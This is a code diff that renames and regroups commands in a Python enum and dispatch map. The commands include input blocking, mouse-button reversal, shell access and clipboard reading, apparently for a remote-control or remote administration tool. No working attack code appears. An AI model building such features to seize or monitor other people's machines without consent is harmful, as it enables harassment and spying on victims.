@@ -20,14 +20,12 @@ class Command(Enum):
     MOVE_FILE = "MOVE_FILE"
     SHELL = "SHELL"
     # Input/Output Commands
-    REVERSE_MOUSE_BUTTON = "REVERSE_MOUSE_BUTTON"
-    BLOCK_ALL_INPUT = "BLOCK_ALL_INPUT"
-    UNBLOCK_ALL_INPUT = "UNBLOCK_ALL_INPUT"
-    BLOCK_MOUSE = "BLOCK_MOUSE"
-    UNBLOCK_MOUSE = "UNBLOCK_MOUSE"
-    BLOCK_MOUSE_SECONDS = "BLOCK_MOUSE_SECONDS"
-    BLOCK_ALL_SECONDS = "BLOCK_ALL_SECONDS"
-    BLOCK_SMART_SECONDS = "BLOCK_SMART_SECONDS"
+    BLOCK = "BLOCK"
+    UNBLOCK = "UNBLOCK"
+    GET_BLOCK_STATUS = "GET_BLOCK_STATUS"
+    REVERSE_MOUSE_BUTTONS = "REVERSE_MOUSE_BUTTONS"
+    BLOCK_SECS = "BLOCK_SECS"
+
     GET_CLIPBOARD = "GET_CLIPBOARD"
     PASTE_TO_CLIPBOARD = "PASTE_TO_CLIPBOARD"
     CLIPBOARD_FILLER = "CLIPBOARD_FILLER"
@@ -133,15 +131,11 @@ command_to_module_map = {
     Command.MOVE_FILE: "file_system",
     Command.SHELL: "file_system",
 
-    # Input/Output Commands
-    Command.REVERSE_MOUSE_BUTTON: "input_output",
-    Command.BLOCK_ALL_INPUT: "input_output",
-    Command.UNBLOCK_ALL_INPUT: "input_output",
-    Command.BLOCK_MOUSE: "input_output",
-    Command.UNBLOCK_MOUSE: "input_output",
-    Command.BLOCK_MOUSE_SECONDS: "input_output",
-    Command.BLOCK_ALL_SECONDS: "input_output",
-    Command.BLOCK_SMART_SECONDS: "input_output",
+    Command.BLOCK: "block_input",
+    Command.UNBLOCK: "block_input",
+    Command.REVERSE_MOUSE_BUTTONS: "block_input",
+    Command.GET_BLOCK_STATUS: "block_input",
+    Command.BLOCK_SECS: "block_input",
     
     Command.GET_CLIPBOARD: "clipboard",
     Command.PASTE_TO_CLIPBOARD: "clipboard",
